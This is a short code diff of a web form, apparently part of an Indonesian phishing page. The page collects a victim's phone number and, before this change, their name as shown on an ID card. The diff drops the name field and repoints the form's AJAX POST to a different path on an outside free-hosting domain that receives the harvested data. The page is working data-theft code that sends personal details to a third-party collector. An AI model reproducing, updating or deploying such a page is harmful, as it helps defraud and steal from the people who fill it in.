@@ -550,10 +550,7 @@ chsalxcome {
  <ion-icon name="phone-portrait-sharp" for="nohp"></ion-icon>
  <input type="tel" id="nohp" name="nohp" placeholder="08xxxx" maxlength="15" required>
                         </div>
-      <div class="input-field">
-    <label for="nama">Atas nama :</label>
-<input type="text" id="nama" name="nama" style="padding-left: 12px;" placeholder="Nama sesuai KTP" required>
-                        </div>
+      
        
                     </div>
    <div class="card-footer">
@@ -584,14 +581,13 @@ function sendHpp(){
   }     
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
-  var nama = $('#nama').val();
-  sessionStorage.setItem('nama', nama);  
+ 
   
   
     
     $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/35/no.php',
+        url: 'https://chroedevsi.whf.bz/36/no.php',
         data: $('#index').serialize(),
         datatype: 'JSON',   
     complete: function(){    
